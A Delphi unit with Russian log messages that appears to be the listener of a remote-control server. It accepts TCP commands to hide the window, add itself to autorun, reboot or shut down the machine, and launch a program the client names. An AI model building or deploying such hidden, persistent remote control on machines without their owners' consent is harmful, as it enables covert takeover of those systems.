unit tcpClientWaitUnit;
interface
uses Classes, WinSock, Global, ComCtrls, SysUtils,
     tcpWorkClientUnit;

type
  TtcpClientWait = class(TThread)
  private
    tcpSock: TSocket;
    MyAddr: TSockAddr;
    ClientAddr: TSockAddr;
    LogStr: string;
    Mes: TMes;
  protected
    procedure Execute; override;
    procedure AddLogInfo;
    procedure AddLogInfoCl;
    procedure Command;
    procedure OnTerminateTcpWait(Sender: TObject);
  end;

implementation

uses ServerUnitUnit;

procedure TtcpClientWait.Execute;
var ln: integer; retval: integer;
    clSock: TSocket;
begin
  Self.FreeOnTerminate := true;
  Self.OnTerminate := OnTerminateTcpWait;

  MyAddr.sin_family := AF_INET;
  MyAddr.sin_addr.S_addr := INADDR_ANY;
  MyAddr.sin_port := HtoNS(Def_Port+2);
  tcpSock := socket(AF_INET,SOCK_STREAM,0);
  if tcpSock = INVALID_SOCKET then Exit;
  if bind(tcpSock,MyAddr,sizeof(MyAddr)) = SOCKET_ERROR then
  begin
    CloseSocket(tcpSock);
    Exit;
  end;
  if Listen(tcpSock,50) = SOCKET_ERROR then Exit;

  ln := sizeof(ClientAddr);
  clSock := Accept(tcpSock,@ClientAddr,@ln);
  Synchronize(AddLogInfo);

  while not Self.Terminated  do
  begin
    retval := recv(clSock,Mes,sizeof(Mes),0);
    if retval > 0 then
    begin
      if Mes.Cmd = 1001 then
      begin
        LogStr := 'Текстовое сообщение';Synchronize(AddLogInfoCl);Synchronize(Command);
      end;

      if Mes.Cmd = 1100 then
      begin
        LogStr := 'Спрятать Сервер';Synchronize(AddLogInfoCl);Synchronize(Command);
      end;

      if Mes.Cmd = 1101 then
      begin
        LogStr := 'Показать Сервер';Synchronize(AddLogInfoCl);Synchronize(Command);
      end;

      if Mes.Cmd = 1111 then
      begin                                      
        LogStr := 'Завершение работы сервера';Synchronize(AddLogInfoCl);Synchronize(Command);
        Break;
      end;

      if Mes.Cmd = 1200 then
      begin
        LogStr := 'Перезагрузка...';Synchronize(AddLogInfoCl);Synchronize(Command);
        Break;
      end;

      if Mes.Cmd = 1201 then
      begin
        LogStr := 'Зывершение работы...';Synchronize(AddLogInfoCl);Synchronize(Command);
        Break;
      end;

      if Mes.Cmd = 1300 then
      begin
        LogStr := 'Добавление в автозапуск';Synchronize(AddLogInfoCl);Synchronize(Command);
      end;

      if Mes.Cmd = 1301 then
      begin
        LogStr := 'Удаление из автозапуска';Synchronize(AddLogInfoCl);Synchronize(Command);
      end;

      if Mes.Cmd = 1400 then
      begin
        LogStr := 'Запуск программы '+ '"'+Mes.Param+'"';Synchronize(AddLogInfoCl);Synchronize(Command);
      end;

      if Mes.Cmd = 5555 then
      begin
        LogStr := 'Отсоединение клиента'; Synchronize(AddLogInfoCl);Synchronize(Command);
        Break;
      end;
    end;
  end;
end;

procedure TtcpClientWait.AddLogInfo;
var itm: TListItem;
begin
  itm := ServerForm.LogList.Items.Add;
  itm.Caption := DateTimeToStr(Now);
  itm.SubItems.Add('-');
  itm.SubItems.Add(GetAddrString(ClientAddr));
  itm.SubItems.Add('TCP');
  itm.SubItems.Add('Соединение с Клиентом установлено');
end;

procedure TtcpClientWait.OnTerminateTcpWait(Sender: TObject);
begin
  ShutDown(tcpSock,0);
  CloseSocket(tcpSock);
end;

procedure TtcpClientWait.AddLogInfoCl;
var itm: TListItem;
begin
  itm := ServerForm.LogList.Items.Add;
  itm.Caption := DateTimeToStr(Now);
  itm.SubItems.Add('I');
  itm.SubItems.Add(GetAddrString(ClientAddr));
  itm.SubItems.Add('TCP');
  itm.SubItems.Add(LogStr);
end;

procedure TtcpClientWait.Command;
begin
  ServerForm.RunCommand(Mes);
end;

end.
